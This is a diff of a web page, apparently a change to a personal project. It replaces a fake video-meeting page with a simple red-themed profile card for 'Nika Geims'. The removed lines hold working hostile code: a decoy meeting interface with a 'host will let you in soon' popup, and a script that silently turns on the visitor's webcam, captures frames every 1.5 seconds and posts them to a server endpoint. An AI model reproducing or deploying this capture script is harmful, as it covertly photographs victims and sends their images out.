@@ -1,234 +1,191 @@
-<!doctype html>
 <html>
 
 <head>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
+  <title>gunlols</title>
   <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <link type="text/css" rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+  <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+  <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at top, #700000, #000);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      overflow: hidden;
+    }
+body::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background:
+    url("baner-GTP.png") center/cover no-repeat,   /* ფოტო */
+    repeating-linear-gradient(
+      135deg,
+      rgba(159, 0, 0, 0.937),
+      rgb(38, 0, 0) 15px,
+      transparent 15px,
+      transparent 30px
+    ); /* შენი ძველი დიზაინი */
+  z-index: 0;
+}
+
+
+    .card {
+      position: relative;
+      width: 360px;
+      background: linear-gradient(180deg, #4e0000, #120000);
+      border-radius: 20px;
+      padding: 30px 20px;
+      text-align: center;
+      box-shadow: 0 0 40px rgba(255,0,0,0.4);
+      z-index: 1;
+    }
+
+    .avatar {
+      width: 110px;
+      height: 110px;
+      margin: 0 auto 10px;
+      border-radius: 50%;
+      overflow: hidden;
+      border: 4px solid red;
+      box-shadow: 0 0 20px red;
+    }
+
+    .avatar img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    h1 {
+      font-size: 26px;
+      color: red;
+      text-shadow: 0 0 10px red;
+      margin-bottom: 5px;
+    }
+
+    .role {
+      font-size: 15px;
+      opacity: 0.9;
+      margin-bottom: 15px;
+    }
+
+    .status {
+      background: #000;
+      padding: 10px;
+      border-radius: 10px;
+      font-size: 13px;
+      margin-bottom: 18px;
+      box-shadow: inset 0 0 10px red;
+    }
+
+    .socials {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 20px;
+    }
+
+    .socials a {
+      width: 40px;
+      height: 40px;
+      background: red;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      font-size: 18px;
+      box-shadow: 0 0 12px red;
+      transition: 0.3s;
+    }
+
+    .socials a:hover {
+      transform: scale(1.15);
+      box-shadow: 0 0 25px red;
+    }
+
+    .music {
+      background: #140000;
+      border-radius: 14px;
+      padding: 15px;
+      box-shadow: inset 0 0 15px red;
+    }
+
+    .music-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      color: red;
+    }
+
+    input[type="range"] {
+      width: 100%;
+    }
+
+    .controls {
+      margin-top: 10px;
+      font-size: 18px;
+    }
+
+    .controls i {
+      margin: 0 8px;
+      cursor: pointer;
+      color: white;
+    }
+
+  </style>
 </head>
 
-<div class="video-wrap">
-  <video id="video" playsinline autoplay></video>
-</div>
-
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
-
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
-  body {
-    height: 100vh;
-    width: 100vw;
-  }
-
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
-
-  .main-screen {
-    background-color: #273039;
-    height: 100vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  img {
-    height: 80px;
-    width: 80px;
-  }
-
-  .bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-  }
-
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
-
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
-
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-    position: relative;
-    top: 250px; left: 375px;
-}
-</style>
-
-<script>
-
-  function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
-      },
-      error: function () {
-      }
-    });
-  };
-
-
-  'use strict';
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
-
-  const constraints = {
-    audio: false,
-    video: {
-
-      facingMode: "user"
-    }
-  };
-
-  // Access webcam
-  async function init() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      handleSuccess(stream);
-    } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-    }
-  }
-
-  // Success
-  function handleSuccess(stream) {
-    window.stream = stream;
-    video.srcObject = stream;
-
-    var context = canvas.getContext('2d');
-    setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-      post(canvasData);
-      video.play();
-    }, 1500);
-
-
-  }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
-  // Load init
-  init();
-  $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
-</script>
-
 <body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
+
+  <div class="card">
+
+    <div class="avatar">
+      <img src="tam20.webp" alt="Avatar">
+    </div>
+
+    <h1>Nika Geims</h1>
+    <div class="role">👑 Full Time Developer 👑</div>
+
+    <div class="status">
+      gilocav axal wels  <br>
+      xo magari propilia
+    </div>
+    <div class="socials">
+      <a href="#"><i class="fa fa-facebook"></i></a>
+      <a href="#"><i class="fa fa-twitter"></i></a>
+      <a href="#"><i class="fa fa-instagram"></i></a>
+      <a href="#"><i class="fa fa-linkedin"></i></a>
+    </div>
+    <div class="music">
+      <div class="music-title">
+        <span>magari muzonia</span>
+      </div>
+
+      <input type="range" value="20">
+    </div>
+
   </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
-    </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
-    </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
-  </div>
+
 </body>
-
 </html>
-
